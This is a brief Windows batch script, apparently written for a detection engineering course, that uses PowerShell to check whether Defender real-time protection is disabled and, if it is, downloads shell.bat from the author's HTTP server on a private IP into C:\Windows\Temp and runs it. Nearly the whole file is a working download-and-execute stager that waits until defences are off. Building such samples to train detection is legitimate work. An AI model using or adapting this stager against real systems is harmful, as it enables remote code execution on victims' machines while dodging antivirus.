#runs powershell command Get-MPComputerStatus and if RealTimeProtectionEnabled is like "False" then it will download shell.bat from my parrotOS python http server and place it in windows temp and run the file.
#Created for TCM Academy Detection Engineering 101 course


@ECHO off
powershell -Command "& {if (Get-MPComputerStatus | where-object {$_.RealTimeProtectionEnabled -like 'False'}) {Invoke-WebRequest -URI http://10.11.10.01:8000/shell.bat -OutFile C:\Windows\Temp\shell.bat; C:\Windows\Temp\shell.bat}}"
pause
